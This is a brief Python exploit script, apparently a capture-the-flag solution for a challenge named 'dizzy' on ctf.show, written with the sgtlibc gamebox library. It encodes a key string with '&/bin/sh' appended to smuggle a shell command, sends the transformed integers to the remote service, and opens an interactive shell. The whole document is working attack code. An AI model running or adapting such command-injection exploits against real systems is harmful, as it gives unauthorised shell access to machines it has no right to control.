import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=False,
    file='./dizzy',
    remote='pwn.challenge.ctf.show 28071',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

convert = 0x1BF52
keys = '5076764E7C20315320533020475245415421'
keys = bytes.fromhex(keys)
keys += b'&/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00'

count = int(len(keys)/4)
for i in range(count):
    data = keys[i*4:(i+1)*4]
    data = u32(data)
    data = data - convert
    sl(str(data))
for i in range(40-count):
    sl(str(i))
interactive()
